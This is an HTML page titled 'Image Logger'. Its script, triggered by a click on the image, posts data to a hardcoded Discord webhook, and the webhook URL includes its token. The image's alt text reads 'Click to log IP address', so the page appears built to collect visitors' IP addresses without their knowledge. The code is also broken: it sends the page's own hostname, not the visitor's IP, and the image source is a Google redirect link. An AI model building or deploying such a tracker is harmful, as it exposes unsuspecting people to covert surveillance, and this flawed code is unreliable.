<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        #image-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        #image {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <div id="image-container">
        <img id="image" src="https://www.google.com/url?sa=i&url=https%3A%2F%2Fnl.wikipedia.org%2Fwiki%2FHervormd_Lyceum_West&psig=AOvVaw2tWg7zCHN9hvs8loqWAWfu&ust=1737307111211000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCIjjxbvj_4oDFQAAAAAdAAAAABAI" alt="Click to log IP address">
    </div>
    <script>
        document.getElementById('image').addEventListener('click', function() {
            fetch('https://discord.com/api/webhooks/1330223699227312158/LesmEazqA2jf3Q3w9_FUgUU1XlyUBRURpR305LMBbpGxDPG7MoUFLNzWZ883MBLvi8di', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `IP Address: ${window.location.hostname}`
                })
            })
            .then(response => response.json())
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
